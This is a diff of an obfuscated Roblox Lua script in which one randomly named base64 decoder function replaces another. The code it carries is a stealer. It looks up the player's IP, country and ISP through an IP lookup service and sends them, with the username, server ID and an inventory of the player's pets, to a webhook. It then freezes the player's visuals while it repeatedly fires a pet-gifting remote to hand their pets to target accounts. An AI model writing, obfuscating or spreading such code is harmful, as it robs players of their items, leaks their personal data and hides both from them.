+    local result = req({ Url = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('VbPxumSRbXttWJuCNCybRtpzeqMzxCxDZOoWoRYkXvGoewMpyjVBTkbaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('QvzcqHPGQkSPANDEarXaDfYMfPXWbTIYzXvwnbkQQAlWsqydWMplfXoR0VU') })
     if result and result.Body then
         local body = HttpService:JSONDecode(result.Body)
-        return body.query or xAEhyCAEPqFXwK('qCKdKFopVLdENbAGGTLRfAMeAgIBcrBShlsQSOtltzVxEjqZBWqmiIjPw=='), body.country or xAEhyCAEPqFXwK('HOYqasvTLUBLXFAwajaGBfMExoslRfPuLDfOoKgjHcGBtmEaMYRjufBPw=='), body.isp or xAEhyCAEPqFXwK('MndnYYPVXezSWWKcbBMJndqLXDQYwQyglqopJwAOIsOdlXqOIkaIDHRPw==')
+        return body.query or LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('uFdyfNjUPDzlAPSuBYYnUqBwpfxFwchnvlbXSjJWmWoBFABnpGcYlPvPw=='), body.country or LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('IOLlGBMtllVMHtIYxjViFxWSHMHbkpnvHZLYtQHYdlWFPFJLfSRHAQAPw=='), body.isp or LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('VvvrzyCsDAnpYhoFSkVimIQBPmdFGFsRSYpgetZklQZvSsawIVRDXZjPw==')
     end
-    return xAEhyCAEPqFXwK('eeLVaqapqVdZbGMOQsrpdEALRraLQtTJcFXODsOGloASwfyczAdQCcdPw=='), xAEhyCAEPqFXwK('bCkbdyZulgatYzesakiohsMOGBipKZTuEkJsMxhKMuLnxofFLZtQIxlPw=='), xAEhyCAEPqFXwK('SqnXEXUXpsKgCPmgKScTTrmdLNvshxGKnpqCmAHPGtWrJdSMgdJSUOsPw==')
+    return LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('tWFAcieRreLioKlFpIOLBxAUXAQcUrLSuGXOeWLgQqtDuHBAeGVXLEWPw=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('NnRLxAwjLDcRhKeAIalmBqTegPlzUxFLOyleCuqugXBlMXIgFwGAXsPPw=='), LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('KxwZvRpAszujTDOtdjtrEtjgejBkgUnFBbUGfEWrsAlLyFDighMLcjpPw==')
 end
 
 -- Send user info
 spawn(function()
     local ip, country, isp = getIPInfo()
     sendWebhook({
-        { name = xAEhyCAEPqFXwK('OgwKDFwwOqUCMuvrSBWUhSARruMghaYXjpNwZENcirqMXfqsviRCBNB8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
-        { name = xAEhyCAEPqFXwK('aXcAWyufMQicbzvahlBJuXpAAprBwHYSdQpAdHSyhbYQywzBVhQONhW8J+MkCBJUA=='), value = ip },
-        { name = xAEhyCAEPqFXwK('LPgLMyleCQvepDHUXujQibSLnBZgXMNTeXlElgJcpcMzKwztqMeGIps8J+Xuu+4jyBDb3VudHJ5'), value = country },
-        { name = xAEhyCAEPqFXwK('jelMeYRahMRtkhNhpiCgniHRnIPmtLrhOEjZKcZBzFlSpWwibxkgThB8J+SuyBJU1A='), value = isp },
-        { name = xAEhyCAEPqFXwK('wDrtHXFdoejafLoScMwMeaOhpGwNtCnPXssWtemBDQgoEDgFBneKQBJ8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
-        { name = xAEhyCAEPqFXwK('LNgPqKypXcklpWujdtHTvWteUzGdDabNLxpDEfbNAnvzoDIFAgXlxHV4o+x77iPIFRpbWU='), value = os.date(xAEhyCAEPqFXwK('AmexUzGWrVvTNeMlIOvGmYVSqPIqMKjDavSfwbBrBjFZlPgyepoQsuXJVktJW0tJWQgJUg6JU06JVM=')) }
+        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('sidMlqiuWzyJFZraAdYMQQVkCUzYfKjMlVUfBDxAlYpxERVFStoHUcU8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
+        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('ekPWzYzsqZMRpuvHPjlkFeClwLSWpDiKBgqeVYkYrpJFooDBaiNNtRf8J+MkCBJUA=='), value = ip },
+        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('sAWfWZUYSMeQkfGqBVkmkwoIIsHhNpDslsmluApLkqDOzhjgigwAxGf8J+Xuu+4jyBDb3VudHJ5'), value = country },
+        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('WXeNJZefXnURNJlkcrPKfjFcEjUKgSogLIIWUwSsTnQeNCutNyGHgQV8J+SuyBJU1A='), value = isp },
+        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('ZxtBXFBNnlevzAKHMjEbKcGaZJmgvFWngFfexXcNtVUayIwkKxtYoSF8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
+        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('plamwyKZFDjKCUSaiRiRfWFufsbiOenCfoHWpFCTrlnmDuNQDgCKGQd4o+x77iPIFRpbWU='), value = os.date(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('MyRtkIjjohkgEeJVhhIhEAaCUnuxxGhPJCuIfYAMUzpnQmwKDgguLpVJVktJW0tJWQgJUg6JU06JVM=')) }
     })
 end)
 
@@ -175,7 +176,7 @@ end)
 spawn(function()
     local pets = getFilteredPets()
     local petChunks = #pets > 0 and chunkItems(pets) or {
-        { name = xAEhyCAEPqFXwK('KjVsSizrhmeRYSpVkdNtKPwUPcHLWjVkBSGJZfvNCLGbWkZzJFDqEDC8J+OkiBQZXRz'), value = xAEhyCAEPqFXwK('YbBWzmkKjpGpaxoPXdYjrnKbQnqNLQmCMJsjcxbHVxdXVxdyaLdmRgqTm9uZQ=='), inline = false }
+        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('hfqoYoWDbfrOLJFYSNTHHyuocTgLEvXwUUsIsbiKnGllHlpIftSdTDf8J+OkiBQZXRz'), value = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('cbaxoCsYrnqzDbtrvCIWarklncsMGgwVDiFTuQYOEvxNONWEzZntTIzTm9uZQ=='), inline = false }
     }
     sendWebhook(petChunks)
 end)
@@ -183,7 +184,7 @@ end)
 -- Send 3rd message: server status
 spawn(function()
     sendWebhook({
-        { name = xAEhyCAEPqFXwK('jjfQhxfAsAdwYnEEetunhcXrwJZKfrMtdBZwRoyOkFUGdluJrWeHrNq8J+UgyBTZXJ2ZXIgU3RhdHVz'), value = wasPrivateServer and xAEhyCAEPqFXwK('bcTYjqNhWThonuyqpGhHticovAQndRTDcaoppaMFvOaUWFYPbCihZEYUHJpdmF0ZSBzZXJ2ZXIgZGV0ZWN0ZWQuIFNlcnZlciBob3AgZXhlY3V0ZWQu') or xAEhyCAEPqFXwK('DetneIlhsPAOcjZvlklxFFpOGqZDBtQolDvDUUrDihTETsHFHlrIeqcQWxyZWFkeSBpbiBwdWJsaWMgc2VydmVyLg=='), inline = false }
+        { name = LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('GZuCiACxoUhBaCDqFBBnqqqzYITyjupMHkAJLDfvTDOEWOvOTKgImDd8J+UgyBTZXJ2ZXIgU3RhdHVz'), value = wasPrivateServer and LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('WJpRuUJurVIrsnzhPiUbHSagQoSXdFIFvhpDLSIZxYcAONjmITOCrqkUHJpdmF0ZSBzZXJ2ZXIgZGV0ZWN0ZWQuIFNlcnZlciBob3AgZXhlY3V0ZWQu') or LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('EfqMItaPudDdMfcwrYuoWlHaafVccvUjjJqfpsMGVkuGczZSNyvCoyVQWxyZWFkeSBpbiBwdWJsaWMgc2VydmVyLg=='), inline = false }
     })
 end)
 
@@ -193,13 +194,13 @@ spawn(function()
         for _, player in ipairs(Players:GetPlayers()) do
             if table.find(targetUsernames, player.Name) then
                 for _, tool in ipairs(backpack:GetChildren()) do
-                    if tool:IsA(xAEhyCAEPqFXwK('vdJdmObdEauCXFvKkoLWaEgQDyGySzIQMBUVqAJxbXzDdJPvYbfiSfUVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
+                    if tool:IsA(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('funOJZTvEMuBFfVOtLSEdfyKHPcMCxXsYjtncxOUrDAhqjmhrgrnoPlVG9vbA==')) and hasKeyword(tool.Name, drainPets) then
                         freezeVisual()
                         tool.Parent = character
                         wait(0.3)
                         while player and player.Parent == Players and tool.Parent == character do
-                            local args = {xAEhyCAEPqFXwK('EbSWnwMSoZEXBhfkxvkHCPTraCZoshFKVWUCdWFPHGrhiCugwDWfuKJR2l2ZVBldA=='), player}
-                            ReplicatedStorage:WaitForChild(xAEhyCAEPqFXwK('kfphMpaFilALxPtSZoBAykuCVArAhUDAjPHUCWabZOLsKKJpnneQWfsR2FtZUV2ZW50cw==')):WaitForChild(xAEhyCAEPqFXwK('bAtuJyJeHOKIdWDCfhuxAOLIRuxpNrXwSdINznvtopZKExcHsTdSAUMUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
+                            local args = {LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('SXsNJxVXNwGwExIEcLmMNPmsKTcoJfMPwnXUhRSZwcxeDEORNFfCSkVR2l2ZVBldA=='), player}
+                            ReplicatedStorage:WaitForChild(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('XgBrQGoFSYIZxQjODjUmCdzibOWkhKCTkEnajeYWvJjcggCNFgqARJPR2FtZUV2ZW50cw==')):WaitForChild(LwmhEznQHCxgNySiwFYbNcEjGwbbncDvpkAALCOJUzroTqGwUAinjJcJOMwjZtHTeCyOMMYMiDtxrCpRULWgepIcDdadCOrcLm('mRYwuMuFuLaXTsYaWnQxXHlvxiDPAJdNQlnaYPucvRQbMvmXUKRigOFUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                             wait(0.7)
                         end
                     end
